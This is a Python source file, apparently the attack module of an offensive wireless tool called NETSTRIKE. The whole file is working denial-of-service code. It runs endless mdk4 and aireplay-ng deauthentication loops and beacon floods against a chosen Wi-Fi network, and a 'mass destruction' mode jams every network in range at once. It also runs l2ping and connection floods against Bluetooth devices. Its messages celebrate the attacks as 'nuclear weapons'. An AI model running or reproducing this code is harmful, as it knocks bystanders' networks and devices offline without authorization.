#!/usr/bin/env python3

import os
import time
import threading
from typing import List

class AttackManager:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner
        self.deauth_processes = []
        self.deauth_running = False
        self.attack_threads = []

    def single_target_attack(self):
        """Attack a single target"""
        print("\033[1;33m[!] ACQUIRING SINGLE TARGET...\033[0m")
        
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[💣] DEPLOYING NETSTRIKE ON: {target['essid']}\033[0m")
                self.start_single_attack(target)

    def start_single_attack(self, target):
        """Start attack on single target"""
        self.deauth_running = True
        
        # Set target channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        print("\033[1;31m[💣] DEPLOYING NUCLEAR WEAPONS...\033[0m")
        
        # Weapon 1: MDK4 Destruction
        proc1 = self.core.run_command(
            f"while true; do mdk4 {self.core.mon_interface} d -c {target['channel']}; sleep 2; done",
            background=True
        )
        if proc1:
            self.deauth_processes.append(proc1)
        
        # Weapon 2: Infinite Deauth
        proc2 = self.core.run_command(
            f"while true; do aireplay-ng --deauth 0 -a {target['bssid']} {self.core.mon_interface}; sleep 1; done", 
            background=True
        )
        if proc2:
            self.deauth_processes.append(proc2)
        
        # Weapon 3: Beacon Flood
        proc3 = self.core.run_command(
            f"while true; do mdk4 {self.core.mon_interface} b -s 1000 -c {target['channel']}; sleep 3; done",
            background=True
        )
        if proc3:
            self.deauth_processes.append(proc3)
        
        print(f"\033[1;32m[✓] {len(self.deauth_processes)} NUCLEAR WEAPONS DEPLOYED\033[0m")
        print(f"\033[1;31m[💥] TARGET {target['essid']} IS BEING DESTROYED\033[0m")
        
        # Start destruction animation
        anim_thread = threading.Thread(target=self.show_destruction_animation)
        anim_thread.daemon = True
        anim_thread.start()
        
        input("\033[1;33m[!] PRESS ENTER TO CEASE FIRE...\033[0m")
        
        self.stop_attacks()
        print("\033[1;32m[✓] NETSTRIKE ATTACK TERMINATED\033[0m")

    def mass_destruction(self):
        """Attack all detected networks"""
        print("\033[1;31m[☢️] INITIATING MASS DESTRUCTION PROTOCOL...\033[0m")
        
        if self.scanner.wifi_scan():
            target_count = len(self.scanner.networks)
            
            if target_count == 0:
                print("\033[1;31m[✘] NO TARGETS FOUND\033[0m")
                return
            
            print(f"\033[1;33m[!] TARGETING {target_count} NETWORKS FOR DESTRUCTION\033[0m")
            
            confirm = input("\033[1;31m[?] CONFIRM MASS DESTRUCTION? (y/N): \033[0m")
            
            if confirm.lower() in ['y', 'yes']:
                self.deauth_running = True
                term_positions = [(0, 0), (300, 0), (0, 200), (300, 200)]
                position_idx = 0
                
                for idx, target in self.scanner.networks.items():
                    print(f"\033[1;31m[→] DEPLOYING: {target['essid']}\033[0m")
                    
                    x, y = term_positions[position_idx]
                    position_idx = (position_idx + 1) % len(term_positions)
                    
                    # Launch attack in separate terminal
                    proc = self.core.run_command(
                        f"xterm -geometry 70x8+{x}+{y} -bg black -fg red -title 'NETSTRIKE-{target['essid']}' -e "
                        f"'bash -c \"iwconfig {self.core.mon_interface} channel {target['channel']}; "
                        f"while true; do mdk4 {self.core.mon_interface} d -c {target['channel']} 2>/dev/null || "
                        f"aireplay-ng --deauth 0 -a {target['bssid']} {self.core.mon_interface}; sleep 2; done\"'",
                        background=True
                    )
                    
                    if proc:
                        self.deauth_processes.append(proc)
                    
                    time.sleep(1)
                
                print(f"\033[1;32m[✓] {target_count} NUCLEAR WARHEADS DEPLOYED\033[0m")
                print("\033[1;31m[💥] ALL NETWORKS ARE BEING DESTROYED\033[0m")
                
                # Start animation
                anim_thread = threading.Thread(target=self.show_destruction_animation)
                anim_thread.daemon = True
                anim_thread.start()
                
                input("\033[1;33m[!] PRESS ENTER TO CEASE FIRE...\033[0m")
                
                self.stop_attacks()
                print("\033[1;32m[✓] MASS DESTRUCTION TERMINATED\033[0m")
            else:
                print("\033[1;33m[!] MASS DESTRUCTION CANCELLED\033[0m")

    def bluetooth_attack(self):
        """Attack Bluetooth devices"""
        print("\033[1;31m[📱] INITIATING BLUETOOTH DESTRUCTION...\033[0m")
        
        # Check Bluetooth tools
        if not self.core.run_command("which hcitool"):
            print("\033[1;31m[✘] BLUETOOTH TOOLS NOT AVAILABLE\033[0m")
            return
        
        # Enable Bluetooth
        self.core.run_command("systemctl start bluetooth")
        self.core.run_command("hciconfig hci0 up")
        
        # Scan for devices
        devices = self.scanner.bluetooth_scan()
        
        if not devices:
            print("\033[1;31m[✘] NO BLUETOOTH DEVICES FOUND\033[0m")
            return
        
        print("\033[1;34m┌──────────────────────┬──────────────────────────────────────────────┐\033[0m")
        print("\033[1;34m│ \033[1;37mMAC Address         TYPE            DEVICE NAME\033[1;34m                   │\033[0m")
        print("\033[1;34m├──────────────────────┼──────────────────────────────────────────────┤\033[0m")
        
        for mac, info in devices.items():
            print(f"\033[1;34m│ \033[1;32m{mac}\033[0m {info['type']:14} \033[1;37m{info['name'][:30]:30}\033[1;34m │\033[0m")
        
        print("\033[1;34m└──────────────────────┴──────────────────────────────────────────────┘\033[0m")
        
        target_mac = input("\n\033[1;33m[?] ENTER BLUETOOTH MAC TO ATTACK: \033[0m").strip()
        
        if target_mac in devices:
            print(f"\033[1;31m[💣] DEPLOYING BLUETOOTH NUKES ON: {devices[target_mac]['name']}\033[0m")
            
            # Attack 1: L2PING Flood
            proc1 = self.core.run_command(
                f"xterm -geometry 80x15+0+300 -bg black -fg cyan -title 'BT-L2PING-FLOOD' -e "
                f"'while true; do l2ping -f {target_mac} 2>/dev/null; sleep 1; done'",
                background=True
            )
            if proc1:
                self.deauth_processes.append(proc1)
            
            # Attack 2: Connection Flood
            proc2 = self.core.run_command(
                f"xterm -geometry 80x15+200+300 -bg black -fg magenta -title 'BT-PACKET-FLOOD' -e "
                f"'while true; do hcitool cc {target_mac} 2>/dev/null && hcitool dc {target_mac} 2>/dev/null; sleep 0.5; done'",
                background=True
            )
            if proc2:
                self.deauth_processes.append(proc2)
            
            print("\033[1;32m[✓] BLUETOOTH DESTRUCTION ACTIVE\033[0m")
            input("\033[1;33m[!] PRESS ENTER TO STOP ATTACK...\033[0m")
            
            self.stop_attacks()
            print("\033[1;32m[✓] BLUETOOTH ATTACK TERMINATED\033[0m")
        else:
            print("\033[1;31m[✘] INVALID BLUETOOTH MAC\033[0m")

    def show_destruction_animation(self):
        """Show destruction animation while attacks are running"""
        frames = ["💣", "🔥", "☢️", "⚡", "💥", "🌋"]
        frame_idx = 0
        
        while self.deauth_running:
            frame = frames[frame_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            
            print(f"\033[1;31m[{frame}] NETSTRIKE DESTRUCTION IN PROGRESS - TARGETS ELIMINATED!\033[0m", end='\r')
            time.sleep(0.3)

    def stop_attacks(self):
        """Stop all running attacks"""
        self.deauth_running = False
        
        # Kill all attack processes
        for proc in self.deauth_processes:
            if proc and proc.poll() is None:
                proc.terminate()
                proc.wait(timeout=2)
        
        self.deauth_processes = []
        
        # Kill any remaining xterm windows
        self.core.run_command("killall xterm 2>/dev/null")
